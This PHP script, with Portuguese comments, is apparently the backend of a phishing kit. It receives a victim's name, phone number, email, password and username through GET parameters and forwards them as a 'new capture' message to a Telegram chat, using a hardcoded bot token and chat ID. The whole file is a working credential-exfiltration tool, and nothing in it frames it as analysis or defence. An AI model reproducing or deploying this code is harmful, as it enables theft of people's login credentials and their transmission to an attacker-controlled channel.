<?php
// Verifica se todos os parâmetros necessários estão presentes
if (isset($_GET['name'], $_GET['tel'], $_GET['email'], $_GET['pass'], $_GET['user'])) {
    
    // Captura os parâmetros
    $name  = htmlspecialchars($_GET['name']);
    $tel   = htmlspecialchars($_GET['tel']);
    $email = htmlspecialchars($_GET['email']);
    $pass  = htmlspecialchars($_GET['pass']);
    $user  = htmlspecialchars($_GET['user']);

    // Cria a mensagem com emojis e formatação bonitinha
    $mensagem = "🔥 *Nova Captura Recebida!* 🔥\n\n"
              . "👤 *Nome:* $name\n"
              . "📱 *Telefone:* $tel\n"
              . "✉️ *Email:* $email\n"
              . "🔐 *Senha:* $pass\n"
              . "🧑‍💻 *Usuário:* $user\n\n"
              . "⏰ _Hora:_ " . date("H:i:s") . "\n"
              . "📅 _Data:_ " . date("d/m/Y");

    // Dados da API do Telegram
    $token = "7114885129:AAHb9cKEsktZ2Da1AAjdzrdxcCNtVCCKDG4";
    $chat_id = "-1002475362928";
    $url = "https://api.telegram.org/bot$token/sendMessage";

    // Envia a mensagem
    $response = file_get_contents($url . "?chat_id=$chat_id&text=" . urlencode($mensagem) . "&parse_mode=Markdown");

    echo "sucess";
} else {
    echo "error";
}
?>
